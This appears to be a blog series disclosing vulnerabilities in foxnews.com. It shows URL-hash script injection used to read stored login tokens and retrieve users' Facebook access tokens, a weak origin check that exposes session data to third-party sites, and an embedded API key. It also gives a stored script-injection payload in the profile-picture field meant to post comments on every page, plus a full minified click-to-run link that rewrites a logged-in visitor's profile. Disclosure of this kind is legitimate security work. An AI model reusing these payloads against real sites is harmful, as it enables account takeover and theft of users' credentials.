# foxnews.com vulnerabilities

This is a series of three articles detailing vulnerabilities in foxnews.com that are patched up now. Before patching they would’ve given attackers full access to visitors’ facebook accounts, posting comments on their behalf, and (worst of all) changed your profile picture.

* [#1: Accessing visitors’ facebook profiles](#1-accessing-visitors-facebook-profiles)
* [#2: Posting comments on behalf of users](#2-posting-comments-on-behalf-of-users)
* [#3: Changing your profile picture](#3-changing-your-profile-picture)

I notified foxnews of each when it was discovered but never heard back.

These are posted for educational purposes.

## #1: Accessing visitors’ facebook profiles

A lot of websites have JS injection vulnerabilities and will run code embedded in URLs. This means if the website stores your data in cookies or *localStorage* thinking only you can access it, now this code can access it.

For example, [foxnews.com](http://foxnews.com) has a[ page](http://foxnews.com/static/v/all/html/xdcomm.html) that evaluates part of URL hash without sanitizing it. So, the following URL shows an alert saying “hi”:

[http://www.foxnews.com/static/v/all/html/xdcomm.html#top;**alert(‘hi’)**:](http://www.foxnews.com/static/v/all/html/xdcomm.html#top;alert%28%27hi%27%29:)

This example shows how, if you link your foxnews.com account to Facebook, you could post on your wall using credentials foxnews.com stores in your browser. Steps 1–3 could all be done in code embedded in the first URL.

1. Grab your ***token*** stored in *localStorage:*

	[http://www.foxnews.com/static/v/all/html/xdcomm.html#top;**alert(localStorage.janrainCaptureToken)**:](http://www.foxnews.com/static/v/all/html/xdcomm.html#top;alert%28localStorage.janrainCaptureToken%29:)

	If you’re logged into foxnews.com you will see some series of letters and numbers — your ***token***, otherwise you’ll see *undefined*.

2. Find your facebook credentials using this ***token*** without logging in — i.e. try incognito mode:

	[https://signin.foxnews.com/entity?type_name=user&access_token=***token***](https://signin.foxnews.com/entity?type_name=user&access_token=janrainCaptureToken)

	This will return a blob of JSON, in particular it has your Facebook ***uid*** and API ***accessToken.***

3. Use these credentials to post a message on your Facebook wall, e.g.

    ```$ curl — data ‘access_token=accessToken' https://graph.facebook.com/uid/feed?message=YourMessage```

** I informed foxnews.com of this; they didn’t respond after multiple days.

## #2: Posting comments on behalf of users

In this article we’ll see how you could change your foxnews.com profile picture so it posts random comments to articles. In short the steps are:

1. Access your foxnews.com account credentials from any site

1. Use these credentials to change your profile picture

1. Inject JS to your profile picture to run on every page load

The remediations are obvious, don’t allow (1), (2), or (3). It’s also obvious when this could get malicious — e.g. if you allow people to change their profile picture, but inject code unknowing to them. You shouldn’t do this.

### 1. Access your foxnews.com account credentials from any site

Your account information is stored in *localStorage* on my.foxnews.com and pages on different domains that need access to this post messages to[ https://my.foxnews.com/xd-channel.html](https://my.foxnews.com/xd-channel.html). So if you’d like to access this information, you’ll wait for a message with name “ready” from this page then post a message with with name “silentLogin” to this page and listen for the response. The response will have all the information you need in order to make request to the foxnews API, like this:

    let silentLoginData = {
     authenticated: true
     token: "<your token>"                                        // ****
     userInfo: {
       'https://foxnews.com/display_name': "<your display name>"  // ****
       "https://foxnews.com/metadata": {
         account_active: true,
         is_active: true,
         picture: "<your profile picture>",                       // ****
       },
       'https://foxnews.com/picture': "<your profile picture>",   // ****
       'https://foxnews.com/user_id': "<your user id>",           // ****
     },
    }

In order to post messages to this page, you need to be coming from either a *foxnews*-ish domain or a *localhost*-ish domain. Examples of the latter allowed by the bold line below would be[ http://localhost](http://localhost/) or[ https://localhost-some-domain.com](https://localhost-test-fun.herokuapp.com/). Note that the second example means that if we add an *xd-channel.html* iframe, we can access this information from a third-party site. Here is the relevant snippet that checks the domains from[ https://my.foxnews.com/js/app/controllers/xd-channel.js](https://my.foxnews.com/js/app/controllers/xd-channel.js?cb=201811271725):

    var allowedOrigins = (function(){
     return function(val) {
       if (!val) { return false; }
      
       var res = false;
       var allowed = [
         /(.+)\.(foxnews|foxbusiness)\.com/i.test(val),
        /localhost/.test(val) // **** here *****
       ];
      
       for (var i = 0; i < allowed.length; i++) {
         if (allowed[i]) {
           res = true;
           break;
         }
       }
       return res;
     };
    })();

### 2. Use these credentials to change your profile picture to include some injected JS

After you receive the response from *xd-channel.html*, you can send requests to api2.foxnews.com to do things like change your display name to “New display name”*:*

    let id = silentLoginData['userInfo']['https://foxnews.com/user_id'];
    let token = silentLoginData['token'];
    let values = {
     url: 'https://api2.fox.com/v2.0/update/' + **id**,
     data: '{"displayName":"**New display name**"}',
     method: 'PUT',
     headers: {
       authorization: 'Bearer '+ **token**,
       content-type: 'application/json',
       x-api-key: 'vHeTnXOe984VBvC0ud8lPpSbsxJ0c7kQ',
     },
    };
    $.ajax(values).done(function(resp) {
     console.log('Response: ', resp);
    });

Check out[ https://my.foxnews.com/js/app/components/auth.js](https://my.foxnews.com/js/app/components/auth.js?cb=201811271725) to figure out what other messages are valid.

foxnews.com has disabled setting your profile picture from their website, but we can set it now by adding a *picture* property to the update values, e.g.

    let values = {
     ...
     data: '{"picture":"http://some-domain.com/some-image.png"}',
     ...
    };

This picture will be the src attribute of every page load, e.g.

    <img src=”http://some-domain.com/some-image.png" />

### 3. Add some JS to your profile picture and every time you load a page, that injected JS runs

As it turns out you can set this value to any string, including the following:

    http://some-domain.com/some-image.png"><script>alert('hello')</script>

So that your profile picture would become the following:

    <img src=”http://some-domain.com/some-image.png"><script>alert('hello')</script>

And “hello” would be alerted on every page load.

### 4. Post a random comment to every comment thread

To do a bit more than print “hello” on every page load, you could instead post a random comment (or a specific comment) to every comment thread you visit by setting your profile picture to the following:

    http://some-domain.com/some-image.png"><script>var s = document.createElement('script'); s.addEventListener('load', comment); s.src = '**<script to post comment>**'+new Date(); document.body.appendChild(s); </script>

I’ll leave ***script to post comment*** as an exercise for the reader.

### Example

As an example you could build a little site running locally or a domain with *localhost* in the name to show the logged in user’s information like the following and change values.

![](https://cdn-images-1.medium.com/max/2728/0*4gHNMG3llcT1AXFv)

Then you’d get something like this on every page load. Useful huh?

![](https://cdn-images-1.medium.com/max/3200/0*fivs684q1JGIa_Ur)

![](https://cdn-images-1.medium.com/max/2560/0*I0B2F3jct0d14e4e)

*** I’ve notified foxnews.com about this and haven’t heard back.

## #3: Changing your profile picture

This is a follow-on to [t](https://medium.com/front-end-hacking/js-injection-example-e07ff4959db9)he above article about JS injection in foxnews.com. That article pointed out that foxnews.com has a couple vulnerabilities:

1. You can inject JS via[ xdcomm.html](http://www.foxnews.com/static/v/all/html/xdcomm.html)

1. They expose facebook your credentials in plain text

They’ve patch up (2), but not (1), which means you can execute arbitrary code, as long as that code fits with the 2038 character limit of URLs. To summarize (1), anything between the last ‘;’ and ‘:’ will get eval’ed in the URL[ http://www.foxnews.com/static/v/all/html/xdcomm.html#top;](http://www.foxnews.com/static/v/all/html/xdcomm.html#top;C=String.fromCharCode%2858%29,Q=String.fromCharCode%2839%29,d=document,cr=function%28e%29%7Breturn)**<CODE>**:. They also expose a function attached to the window, *setUserProfile,* which updates the user’s profile.

![](https://cdn-images-1.medium.com/max/2152/0*IWcKDbJv4EABLxhQ)

That’s what we’ll call in order to create a link that will change your foxnews.com profile to Kermit the Frog.

In order to to call this function we have to go through the auth flow, which will require the following in the new code — all in[ this gist](https://gist.github.com/spudtrooper/bb3104d09acf57d18ff3e5985fa81df1):

1. Populate the page with enough DOM elements so the flow will complete and doesn’t crash — done through *addFakeContent*

1. Load all the scripts from the[ profile page](https://www.foxnews.com/community/auth/user/profile.html) to perform the auth — done through *loadAssets*

1. Call *setUserProfile *with new user properties — done through *changeProfile*

If you minify this code and add it to[ xdcomm.html](http://www.foxnews.com/static/v/all/html/xdcomm.html) you get a link that when clicked will change your profile to be Kermit the Frog:

[Change your profile to Kermit the Frog](http://www.foxnews.com/static/v/all/html/xdcomm.html#top;C=String.fromCharCode%2858%29,Q=String.fromCharCode%2839%29,d=document,cr=function%28e%29%7Breturn%20d.createElement%28e%29%7D,ap=function%28e%29%7Bd.body.appendChild%28e%29%7D,changeProfile=function%28%29%7Bu=%7B%7D,u.picture=%22https%22+C+%22//upload.wikimedia.org/wikipedia/en/thumb/6/62/Kermit_the_Frog.jpg/220px-Kermit_the_Frog.jpg%22,u.account_active=%22true%22,u.agreed_terms=!0,u.birthday=%221980-01-02%22,u.name=%22kermit@gmail.com%22,u.last_name=%22The%20Frog%22,u.first_name=%22Kermit%22,u.display_name=%28%22kermie%22+1e20*Math.random%28%29%29.substring%280,15%29,u.gender=%22male%22,u.zip_code=%2210503%22,u.political_views=%22democrat%22,p=%7B%7D,p.user_metadata=u,setUserProfile%28p,function%28e,a%29%7Bconsole.log%28JSON.stringify%28a%29%29%7D%29%7D,preparePage=function%28e%29%7B!function%28%29%7Bvar%20e=cr%28%22meta%22%29;e.setAttribute%28%22name%22,%22auth_type%22%29,e.setAttribute%28%22content%22,%22profile%22%29,d.head.appendChild%28e%29;var%20a=cr%28%22a%22%29;a.className=%22login%22,ap%28a%29;var%20t=cr%28%22button%22%29;function%20i%28e%29%7Breturn%22%3Cselect%20display=%22+Q+%22%20name=%22+Q+e+Q+%22%3E%3C/select%3E%22%7Dt.className=%22auth0-btn-logout%22,ap%28t%29,changePass=cr%28%22a%22%29,changePass.id=%22change-pass%22,ap%28changePass%29;var%20n=cr%28%22div%22%29;n.className=%22fn-user-profile%22,n.innerHTML=[i%28%22first_name%22%29,i%28%22birthday%22%29,i%28%22last_name%22%29,i%28%22display_name%22%29,i%28%22political_views%22%29,i%28%22household_income%22%29,i%28%22gender%22%29,i%28%22zip_code%22%29,i%28%22profile_picture%22%29,i%28%22fb_breaking_alerts%22%29,i%28%22fn_breaking_alerts%22%29,i%28%22fn_morn_headlines%22%29,i%28%22top_headline%22%29,i%28%22fn_opinion_headlines%22%29,i%28%22fn_fox_411_newsletter%22%29,i%28%22fn_science_and_technology%22%29,i%28%22fn_health_newsletter%22%29,i%28%22fox_fan_scoop%22%29,i%28%22halftime_report%22%29].join%28%22%22%29,ap%28n%29;var%20r=cr%28%22div%22%29;r.className=%22auth0-optional%22,r.innerHTML=[i%28%22political_views%22%29,i%28%22household_income%22%29,i%28%22fn_breaking_alerts%22%29,i%28%22fn_morn_headlines%22%29,i%28%22top_headline%22%29,i%28%22halftime_report%22%29].join%28%22%22%29,ap%28r%29%7D%28%29,function%20a%28t%29%7Bif%28t.length%29%7Bvar%20i,n,r=t.shift%28%29;i=%22//global.fncstatic.com/static/orion/scripts/core/%22+r,%28n=cr%28%22script%22%29%29.src=i,ap%28n%29,setTimeout%28a.bind%28this,t%29,100%29%7Delse%20setTimeout%28e,200%29%7D%28[%22auth/app/libs/core-js.min.js%22,%22auth/app/libs/sweetalert2.min.js%22,%22ag.core.js?v=20180509153054%22,%22auth/loader.js?v=20180509153054%22]%29%7D,preparePage%28changeProfile%29;:)

When logged into foxnews.com and click this link, your profile will turn into this:

![](https://cdn-images-1.medium.com/max/3200/0*mlfjL7cZ1d05LpiH)
